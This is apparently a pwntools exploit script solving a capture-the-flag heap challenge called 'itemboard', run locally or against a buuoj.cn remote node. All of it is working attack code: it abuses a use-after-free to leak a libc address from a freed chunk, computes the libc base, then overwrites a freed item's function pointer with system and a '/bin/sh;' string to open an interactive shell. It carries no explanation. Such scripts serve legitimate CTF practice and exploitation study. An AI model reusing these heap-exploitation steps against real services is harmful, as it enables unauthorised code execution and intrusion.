import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./itemboard')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./itemboard')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',29858)
			elf=ELF('./itemboard')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,b,c):
			io.sendlineafter('choose:','1')
			io.sendlineafter('Item name?',a)
			io.sendlineafter("Description's len?",str(b))
			io.sendlineafter('Description?',c)

		def list(a):
			io.sendlineafter('choose:','2')

		def show(a):
			io.sendlineafter('choose:','3')
			io.sendlineafter('Which item?',str(a))

		def delete(a):
			io.sendlineafter('choose:','4')
			io.sendlineafter('Which item?',str(a))

		add('keer',0x88,'keer1')
		add('keer',0x88,'keer1')
		add('keer',0x20,'keer')
		delete(0)
		show(0)
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		delete(1)
		add('keer',0x18,'/bin/sh;'+'1'*8+p64(libc.sym['system'])[:-1])
		delete(0)







		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive('>.<_keer_>.< => ')

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue